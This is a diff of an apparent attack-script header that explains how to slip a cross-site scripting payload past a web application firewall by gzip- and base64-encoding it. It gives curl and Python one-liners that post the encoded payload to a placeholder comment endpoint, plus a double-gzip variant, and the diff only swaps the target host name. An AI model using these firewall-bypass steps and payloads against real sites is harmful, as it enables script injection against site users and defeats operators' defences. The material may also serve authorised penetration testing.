@@ -7,18 +7,18 @@
 # framework) decompresses AFTER inspection - the payload never exists in
 # scanned bytes.
 #
-# WHAT TO EDIT: target.com + endpoint. The GZIP-B64 line below is a REAL
+# WHAT TO EDIT: target.example.invalid + endpoint. The GZIP-B64 line below is a REAL
 # gzip of: {"comment":"<img src=x onerror=alert(document.domain)>"}
 # ============================================================================
 
 ### 1) curl one-shot (paste the base64 into GZB64 then run)
 #   GZB64='H4sIAErUwmoC/6tWSs7PzU3NK1GyUipOTEtV0kESsMnMTVcoLkq2rVDIz0stKsovsk3MSS0q0UjJTy4FqdFLyc9NzMzTtFOqBQC6OOOKSQAAAA=='
-#   echo $GZB64 | base64 -d | curl -s -X POST https://target.com/api/comment \
+#   echo $GZB64 | base64 -d | curl -s -X POST https://target.example.invalid/api/comment \
 #     -H 'Content-Type: application/json' -H 'Content-Encoding: gzip' \
 #     --data-binary @- | head -c 400
 
 ### 2) python one-liner variant
-#   python3 -c "import gzip,base64,urllib.request as u; d=base64.b64decode('GZB64'); r=u.Request('https://target.com/api/comment', data=d, headers={'Content-Type':'application/json','Content-Encoding':'gzip'}); print(u.urlopen(r).read()[:400])"
+#   python3 -c "import gzip,base64,urllib.request as u; d=base64.b64decode('GZB64'); r=u.Request('https://target.example.invalid/api/comment', data=d, headers={'Content-Type':'application/json','Content-Encoding':'gzip'}); print(u.urlopen(r).read()[:400])"
 
 ### 3) double-gzip (when single-gzip is decoded by the WAF)
 #   gzip twice before sending; keep Content-Encoding: gzip
